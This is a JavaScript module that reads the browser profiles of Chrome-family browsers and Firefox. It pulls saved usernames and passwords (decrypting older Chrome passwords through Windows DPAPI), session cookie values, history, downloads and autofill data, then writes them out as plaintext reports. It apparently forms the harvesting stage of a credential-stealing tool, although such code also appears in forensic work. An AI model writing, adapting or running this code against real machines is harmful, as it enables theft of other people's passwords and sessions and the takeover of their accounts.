/**
 * Browser Data Decryption Module
 * Handles decryption and parsing of browser data files
 */

const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const { logger } = require('../../core/logger');
const { ErrorHandler, ModuleError } = require('../../core/errors');

// Try to load DPAPI module - will only work on Windows
let dpapi = null;
try {
    dpapi = require('@primno/dpapi');
} catch (error) {
    logger.debug('DPAPI module not available (running on non-Windows system?)');
}

class BrowserDecryptor {
    constructor() {
        this.isWindows = process.platform === 'win32';
    }

    /**
     * Decrypt and parse browser data file
     * @param {string} filePath - Path to the browser data file
     * @param {string} dataType - Type of data (passwords, cookies, history, etc.)
     * @param {string} browserType - Browser type (chrome, firefox, edge, etc.)
     * @returns {Promise<Array>} Parsed data array
     */
    async decryptAndParse(filePath, dataType, browserType) {
        try {
            if (!fs.existsSync(filePath)) {
                logger.debug(`Data file does not exist: ${filePath}`);
                return [];
            }

            // Check file size
            const stats = fs.statSync(filePath);
            if (stats.size === 0) {
                logger.debug(`Data file is empty: ${filePath}`);
                return [];
            }

            // Firefox uses different approach
            if (browserType === 'firefox') {
                return await this.parseFirefoxData(filePath, dataType);
            }

            // Chrome-based browsers (Chrome, Edge, Brave, Opera)
            return await this.parseChromeBasedData(filePath, dataType, browserType);

        } catch (error) {
            logger.error(`Failed to decrypt/parse ${dataType} from ${filePath}`, error.message);
            return [];
        }
    }

    /**
     * Parse Chrome-based browser data
     * @param {string} filePath - Path to the database file
     * @param {string} dataType - Type of data
     * @param {string} browserType - Browser type
     * @returns {Promise<Array>} Parsed data
     */
    async parseChromeBasedData(filePath, dataType, browserType) {
        return new Promise((resolve, reject) => {
            // Copy file to temp location for reading (browsers may have it locked)
            const tempFile = filePath + '.temp';
            try {
                fs.copyFileSync(filePath, tempFile);
            } catch (error) {
                logger.debug(`Could not copy database file: ${error.message}`);
                resolve([]);
                return;
            }

            const db = new sqlite3.Database(tempFile, sqlite3.OPEN_READONLY, (err) => {
                if (err) {
                    logger.debug(`Could not open database: ${err.message}`);
                    // Clean up temp file
                    try {
                        fs.unlinkSync(tempFile);
                    } catch (e) {}
                    resolve([]);
                    return;
                }

                this.queryDatabase(db, dataType, browserType)
                    .then(data => {
                        db.close((err) => {
                            if (err) {
                                logger.debug(`Error closing database: ${err.message}`);
                            }
                            // Clean up temp file
                            try {
                                fs.unlinkSync(tempFile);
                            } catch (e) {}
                            resolve(data);
                        });
                    })
                    .catch(error => {
                        db.close();
                        try {
                            fs.unlinkSync(tempFile);
                        } catch (e) {}
                        logger.debug(`Database query failed: ${error.message}`);
                        resolve([]);
                    });
            });
        });
    }

    /**
     * Query SQLite database for specific data type
     * @param {Object} db - SQLite database connection
     * @param {string} dataType - Type of data to query
     * @param {string} browserType - Browser type
     * @returns {Promise<Array>} Query results
     */
    async queryDatabase(db, dataType, browserType) {
        return new Promise((resolve, reject) => {
            let query = '';
            let processor = null;

            switch (dataType) {
                case 'passwords':
                    query = `SELECT origin_url, username_value, password_value, date_created 
                            FROM logins 
                            WHERE blacklisted_by_user = 0 
                            ORDER BY date_created DESC`;
                    processor = this.processPasswordRow.bind(this);
                    break;

                case 'cookies':
                    query = `SELECT host_key, name, value, path, expires_utc, is_secure, is_httponly, creation_utc 
                            FROM cookies 
                            ORDER BY creation_utc DESC 
                            LIMIT 1000`;
                    processor = this.processCookieRow.bind(this);
                    break;

                case 'history':
                    query = `SELECT url, title, visit_count, last_visit_time 
                            FROM urls 
                            WHERE visit_count > 0 
                            ORDER BY last_visit_time DESC 
                            LIMIT 1000`;
                    processor = this.processHistoryRow.bind(this);
                    break;

                case 'downloads':
                    query = `SELECT target_path, referrer, total_bytes, start_time, end_time, state 
                            FROM downloads 
                            ORDER BY start_time DESC 
                            LIMIT 500`;
                    processor = this.processDownloadRow.bind(this);
                    break;

                case 'autofill':
                    query = `SELECT name, value, count, date_created 
                            FROM autofill 
                            ORDER BY count DESC, date_created DESC 
                            LIMIT 500`;
                    processor = this.processAutofillRow.bind(this);
                    break;

                default:
                    resolve([]);
                    return;
            }

            const results = [];
            db.each(query, (err, row) => {
                if (err) {
                    logger.debug(`Query error: ${err.message}`);
                    return;
                }

                try {
                    const processedRow = processor ? processor(row, browserType) : row;
                    if (processedRow) {
                        results.push(processedRow);
                    }
                } catch (error) {
                    logger.debug(`Row processing error: ${error.message}`);
                }
            }, (err, count) => {
                if (err) {
                    reject(err);
                } else {
                    resolve(results);
                }
            });
        });
    }

    /**
     * Process password row and decrypt password
     * @param {Object} row - Database row
     * @param {string} browserType - Browser type
     * @returns {Object} Processed password data
     */
    processPasswordRow(row, browserType) {
        try {
            let password = '';
            
            if (row.password_value && row.password_value.length > 0) {
                if (this.isWindows && dpapi) {
                    try {
                        // Chrome v80+ uses a different encryption method, but fallback to DPAPI for older versions
                        const encryptedPassword = Buffer.from(row.password_value);
                        
                        // Check if it's Chrome v80+ format (starts with "v10" or "v11")
                        if (encryptedPassword.length > 3 && 
                            (encryptedPassword.toString('utf8', 0, 3) === 'v10' || 
                             encryptedPassword.toString('utf8', 0, 3) === 'v11')) {
                            // This requires the master key from Local State file - for now, mark as encrypted
                            password = '[Encrypted - Chrome v80+]';
                        } else {
                            // Try DPAPI decryption for older versions
                            const decrypted = dpapi.unprotectData(encryptedPassword, null, 'CurrentUser');
                            password = decrypted.toString('utf8');
                        }
                    } catch (error) {
                        password = '[Decryption Failed]';
                    }
                } else {
                    password = '[Encrypted - Non-Windows System]';
                }
            }

            return {
                url: row.origin_url || '',
                username: row.username_value || '',
                password: password,
                dateCreated: this.formatTimestamp(row.date_created)
            };
        } catch (error) {
            logger.debug(`Password processing error: ${error.message}`);
            return null;
        }
    }

    /**
     * Process cookie row
     * @param {Object} row - Database row
     * @returns {Object} Processed cookie data
     */
    processCookieRow(row) {
        try {
            return {
                host: row.host_key || '',
                name: row.name || '',
                value: row.value || '',
                path: row.path || '',
                secure: row.is_secure === 1,
                httpOnly: row.is_httponly === 1,
                expires: this.formatTimestamp(row.expires_utc),
                created: this.formatTimestamp(row.creation_utc)
            };
        } catch (error) {
            logger.debug(`Cookie processing error: ${error.message}`);
            return null;
        }
    }

    /**
     * Process history row
     * @param {Object} row - Database row
     * @returns {Object} Processed history data
     */
    processHistoryRow(row) {
        try {
            return {
                url: row.url || '',
                title: row.title || '',
                visitCount: row.visit_count || 0,
                lastVisit: this.formatTimestamp(row.last_visit_time)
            };
        } catch (error) {
            logger.debug(`History processing error: ${error.message}`);
            return null;
        }
    }

    /**
     * Process download row
     * @param {Object} row - Database row
     * @returns {Object} Processed download data
     */
    processDownloadRow(row) {
        try {
            return {
                path: row.target_path || '',
                referrer: row.referrer || '',
                size: row.total_bytes || 0,
                startTime: this.formatTimestamp(row.start_time),
                endTime: this.formatTimestamp(row.end_time),
                state: row.state || 0
            };
        } catch (error) {
            logger.debug(`Download processing error: ${error.message}`);
            return null;
        }
    }

    /**
     * Process autofill row
     * @param {Object} row - Database row
     * @returns {Object} Processed autofill data
     */
    processAutofillRow(row) {
        try {
            return {
                name: row.name || '',
                value: row.value || '',
                count: row.count || 0,
                dateCreated: this.formatTimestamp(row.date_created)
            };
        } catch (error) {
            logger.debug(`Autofill processing error: ${error.message}`);
            return null;
        }
    }

    /**
     * Parse Firefox data
     * @param {string} filePath - Path to Firefox data file
     * @param {string} dataType - Type of data
     * @returns {Promise<Array>} Parsed data
     */
    async parseFirefoxData(filePath, dataType) {
        try {
            if (dataType === 'passwords' && filePath.endsWith('logins.json')) {
                // Firefox stores passwords in JSON format
                const data = fs.readFileSync(filePath, 'utf8');
                const loginData = JSON.parse(data);
                
                return (loginData.logins || []).map(login => ({
                    url: login.hostname || '',
                    username: login.encryptedUsername || '[Encrypted]',
                    password: login.encryptedPassword || '[Encrypted]',
                    dateCreated: this.formatTimestamp(login.timeCreated)
                }));
            }

            // For SQLite files in Firefox
            if (filePath.endsWith('.sqlite')) {
                return await this.parseChromeBasedData(filePath, dataType, 'firefox');
            }

            return [];
        } catch (error) {
            logger.debug(`Firefox data parsing error: ${error.message}`);
            return [];
        }
    }

    /**
     * Format Chrome timestamp to readable date
     * @param {number} timestamp - Chrome timestamp (microseconds since 1601)
     * @returns {string} Formatted date string
     */
    formatTimestamp(timestamp) {
        try {
            if (!timestamp || timestamp === 0) {
                return 'Unknown';
            }

            // Chrome timestamps are microseconds since January 1, 1601 UTC
            const epochDiff = 11644473600000000; // Microseconds between 1601 and 1970
            const jsTimestamp = (timestamp - epochDiff) / 1000; // Convert to milliseconds
            
            const date = new Date(jsTimestamp);
            return date.toISOString().replace('T', ' ').replace('Z', '');
        } catch (error) {
            return 'Invalid Date';
        }
    }

    /**
     * Convert data array to formatted text
     * @param {Array} data - Parsed data array
     * @param {string} dataType - Type of data
     * @returns {string} Formatted text content
     */
    formatDataAsText(data, dataType) {
        if (!data || data.length === 0) {
            return `No ${dataType} found.\n`;
        }

        let text = `=== ${dataType.toUpperCase()} (${data.length} entries) ===\n\n`;

        switch (dataType) {
            case 'passwords':
                data.forEach((item, index) => {
                    text += `[${index + 1}] ${item.url}\n`;
                    text += `Username: ${item.username}\n`;
                    text += `Password: ${item.password}\n`;
                    text += `Date Created: ${item.dateCreated}\n`;
                    text += `${'='.repeat(50)}\n\n`;
                });
                break;

            case 'cookies':
                data.forEach((item, index) => {
                    text += `[${index + 1}] ${item.host}\n`;
                    text += `Name: ${item.name}\n`;
                    text += `Value: ${item.value}\n`;
                    text += `Path: ${item.path}\n`;
                    text += `Secure: ${item.secure}\n`;
                    text += `HttpOnly: ${item.httpOnly}\n`;
                    text += `Expires: ${item.expires}\n`;
                    text += `Created: ${item.created}\n`;
                    text += `${'='.repeat(50)}\n\n`;
                });
                break;

            case 'history':
                data.forEach((item, index) => {
                    text += `[${index + 1}] ${item.title}\n`;
                    text += `URL: ${item.url}\n`;
                    text += `Visit Count: ${item.visitCount}\n`;
                    text += `Last Visit: ${item.lastVisit}\n`;
                    text += `${'='.repeat(50)}\n\n`;
                });
                break;

            case 'downloads':
                data.forEach((item, index) => {
                    text += `[${index + 1}] ${path.basename(item.path)}\n`;
                    text += `Full Path: ${item.path}\n`;
                    text += `Referrer: ${item.referrer}\n`;
                    text += `Size: ${item.size} bytes\n`;
                    text += `Start Time: ${item.startTime}\n`;
                    text += `End Time: ${item.endTime}\n`;
                    text += `${'='.repeat(50)}\n\n`;
                });
                break;

            case 'autofill':
                data.forEach((item, index) => {
                    text += `[${index + 1}] ${item.name}\n`;
                    text += `Value: ${item.value}\n`;
                    text += `Count: ${item.count}\n`;
                    text += `Date Created: ${item.dateCreated}\n`;
                    text += `${'='.repeat(50)}\n\n`;
                });
                break;

            default:
                text += JSON.stringify(data, null, 2);
        }

        return text;
    }
}

module.exports = {
    BrowserDecryptor
};